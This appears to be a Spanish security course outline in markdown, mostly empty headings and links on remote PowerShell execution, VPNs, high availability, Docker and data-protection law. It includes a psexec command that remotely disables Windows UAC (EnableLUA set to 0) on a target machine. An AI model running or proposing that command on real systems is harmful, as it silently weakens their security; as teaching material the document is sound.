**Ejecutar un comando remotamente en un equipo con PowerShell**

* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2019/2019-01-14.md
* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2019/2019-01-15.md
* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2019/2019-01-16.md
* https://www.jesusninoc.com/10/07/crear-un-cliente-y-un-servidor-tcpip-con-powershell/
* https://www.jesusninoc.com/03/08/psexec/
```cmd
psexec \\dnsname-or-ip reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
```

### Implantación de VPNs. Instalación y configuración básica de clientes y servidores.


### Protocolos de autenticación.


### Configuración de parámetros de acceso.


### Servidores de autenticación.


# Implantación de soluciones de alta disponibilidad

## Definición y objetivos.


## Análisis de configuraciones de alta disponibilidad.


### Funcionamiento interrumpido y alta disponibilidad.


### Balanceadores de carga.


### Almacenamiento compartido. Sistemas de archivos y dispositivos de bloque.


### Servidores redundantes.


### Sistemas de «clusters».


### Integridad de datos y recuperación de servicio.


## Instalación y configuración de soluciones de alta disponibilidad.


## Virtualización de sistemas.

**Virtualización 2**

**Virtualización en PowerShell**
https://www.jesusninoc.com/2017/07/06/6-virtualizacion-en-powershell/
**Azure**
https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/01105d97-aa35-497d-af6d-52539785680c.png

**Docker**

**Introducción**
https://www.youtube.com/watch?v=HSyaF9KOzdk
**Curso de Docker**
https://www.youtube.com/playlist?list=PLEtcGQaT56chIpnSavOSvaU2ZGAW7d1vE
**Get started with Docker for Mac**
https://docs.docker.com/docker-for-mac/#check-versions-of-docker-engine-compose-and-machine
**Get Docker CE for Ubuntu**
https://docs.docker.com/install/linux/docker-ce/ubuntu/
**WSL Interoperability with Docker**
https://blogs.technet.microsoft.com/virtualization/2017/12/08/wsl-interoperability-with-docker/
**Start a Dockerized web server**
```docker
docker run -d -p 80:80 --name webserver nginx
```
**Get Started, Part 3: Services**
https://docs.docker.com/get-started/part3/
**Docker Microsoft**
* https://docs.microsoft.com/es-es/virtualization/windowscontainers/quick-start/quick-start-windows-10
* https://docs.microsoft.com/es-es/virtualization/windowscontainers/about/
* https://docs.microsoft.com/es-es/virtualization/windowscontainers/manage-containers/hyperv-container
**Windows Docker Machine**
https://github.com/StefanScherer/windows-docker-machine
**Contenedor SSH con Docker**
* https://stackoverflow.com/questions/44429840/no-public-port-22-tcp-published-for-test-sshd
* https://hub.docker.com/r/rastasheep/ubuntu-sshd/
```docker
docker container run -d -p 2222:22 --name test_sshd rastasheep/ubuntu-sshd:16.04
```
```bash
ssh root@localhost -p 2222
```
**Crear y ejecutar un script de Bash realizando una conexión SSH a un contenedor Docker desde PowerShell en Windows**
https://www.jesusninoc.com/2017/10/21/crear-y-ejecutar-un-script-de-bash-realizando-una-conexion-ssh-a-un-contenedor-docker-desde-powershell-en-windows/

### Posibilidades de la virtualización.


### Herramientas para la virtualización.


### Configuración y utilización de máquinas virtuales.


### Alta disponibilidad y virtualización.


### Simulación de servicios con virtualización.


## Pruebas de carga. Cargas sintéticas.


# Legislación y normas sobre seguridad

## Legislación sobre protección de datos.

**Control y notificaciones**

* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-02-12.md#control

**Web Application Penetration Testing Course URLs.docx**

* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2019/2019-02-04.md
* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2019/2019-02-05.md
* https://paper.tuisec.win/detail/eeb64a1fb983f6a

## Legislación sobre los servicios de la sociedad de la información y correo electrónico.

- https://ayudaleyprotecciondatos.es/2019/03/15/guia-sobre-lssi-ce-que-es-como-cumplir-la-ley-este-2019/

Ejemplo:

Los enlaces del repositorio `ClasesSeguridad` han sido normalizados al formato `master/AÑO/AAAA-MM-DD.md`, por ejemplo, 2017/2017-09-26.md.
